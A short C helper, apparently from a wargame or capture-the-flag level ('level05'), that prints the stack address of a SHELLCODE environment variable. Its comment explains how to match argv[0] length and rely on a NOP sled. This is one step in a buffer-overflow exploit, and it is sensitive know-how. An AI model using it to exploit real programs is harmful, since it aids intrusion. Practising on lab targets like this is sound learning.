/* loce.c -- print the address of the SHELLCODE environment variable.
 *
 * Compile as 32-bit and run it. IMPORTANT: the address depends on the length
 * of argv[0] (the string used to launch the program), because environment
 * variables sit just past argv on the stack. Launch this helper with a path
 * of the SAME LENGTH you use to launch the target (e.g. "./level05" is 9
 * chars, so "/tmp/loce" -- also 9 chars -- lines up nicely). The NOP sled in
 * the shellcode absorbs any residual difference.
 *
 *   gcc -m32 loce.c -o /tmp/loce
 *   /tmp/loce
 */
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    printf("%p\n", getenv("SHELLCODE"));
    return 0;
}
